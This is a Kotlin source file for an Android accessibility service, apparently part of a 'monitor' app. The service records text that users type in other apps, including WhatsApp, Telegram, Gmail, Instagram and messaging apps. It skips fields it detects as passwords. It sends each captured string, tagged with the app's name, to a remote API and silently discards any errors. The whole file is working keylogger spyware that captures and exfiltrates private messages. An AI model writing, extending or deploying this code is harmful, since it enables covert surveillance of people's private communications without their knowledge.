package com.empresa.monitor.service.keyboard

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.KeyLogRequest
import kotlinx.coroutines.*

class KeyboardLoggerService : AccessibilityService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastTextMap = mutableMapOf<String, String>() // viewId -> last text
    private var currentAppPackage: String? = null
    private var currentAppName: String? = null

    companion object {
        private var instance: KeyboardLoggerService? = null
        fun getInstance() = instance
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                currentAppPackage = event.packageName?.toString()
                currentAppName = resolveAppName(currentAppPackage)
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                handleTextChange(event)
            }

            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val source = event.source
                if (source != null && source.isEditable) {
                    currentAppPackage = event.packageName?.toString()
                    currentAppName = resolveAppName(currentAppPackage)
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Detect clicks on input fields
                val source = event.source
                if (source != null && source.isEditable) {
                    // Capture current text
                    captureNodeText(source)
                }
            }
        }
    }

    private fun handleTextChange(event: AccessibilityEvent) {
        val packageName = currentAppPackage ?: event.packageName?.toString() ?: return
        val source = event.source ?: return

        // Get the current text
        val currentText = source.text?.toString() ?: return
        if (currentText.length < 2) return // ignore single chars

        // Skip password fields
        if (isPasswordField(source)) return

        // Check if text actually changed
        val viewId = "${source.className}:${source.viewIdResourceName}"
        val previousText = lastTextMap[viewId]
        if (currentText == previousText) return
        lastTextMap[viewId] = currentText

        // Determine the app
        val appName = resolveAppName(packageName)

        // Only send meaningful text
        if (currentText.length <= 200) {
            scope.launch {
                try {
                    ApiClient.api.sendKeyLog("device_id_placeholder", KeyLogRequest(
                        appPackage = packageName,
                        appName = appName,
                        text = currentText,
                        eventType = "text_changed"
                    ))
                } catch (e: Exception) { /* silent */ }
            }
        }
    }

    private fun captureNodeText(node: AccessibilityNodeInfo?) {
        if (node == null) return
        if (node.isEditable) {
            val text = node.text?.toString() ?: return
            if (text.length >= 2) {
                val viewId = "${node.className}:${node.viewIdResourceName}"
                lastTextMap[viewId] = text
            }
        }
        // Recursively check children
        for (i in 0 until node.childCount) {
            captureNodeText(node.getChild(i))
        }
    }

    private fun isPasswordField(node: AccessibilityNodeInfo): Boolean {
        val className = node.className?.toString() ?: ""
        val viewId = node.viewIdResourceName ?: ""
        val hint = node.text?.toString()?.lowercase() ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""

        return className.contains("password", ignoreCase = true) ||
                viewId.contains("password", ignoreCase = true) ||
                hint.contains("password") ||
                hint.contains("contraseña") ||
                hint.contains("senha") ||
                contentDesc.contains("password") ||
                contentDesc.contains("contraseña")
    }

    private fun resolveAppName(packageName: String?): String {
        return when {
            packageName == null -> "Unknown"
            packageName.contains("whatsapp") -> "WhatsApp"
            packageName.contains("chrome") -> "Chrome"
            packageName.contains("telegram") -> "Telegram"
            packageName.contains("instagram") -> "Instagram"
            packageName.contains("facebook") -> "Facebook"
            packageName.contains("messenger") -> "Messenger"
            packageName.contains("gmail") -> "Gmail"
            packageName.contains("outlook") -> "Outlook"
            packageName.contains("messages") -> "Messages"
            packageName.contains("twitter") || packageName.contains("x.com") -> "X / Twitter"
            packageName.contains("tiktok") -> "TikTok"
            packageName.contains("line") -> "LINE"
            packageName.contains("snapchat") -> "Snapchat"
            packageName.contains("notes") -> "Notes"
            else -> packageName.substringAfterLast(".").ifEmpty { packageName }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        instance = null
        scope.cancel()
        super.onDestroy()
    }
}
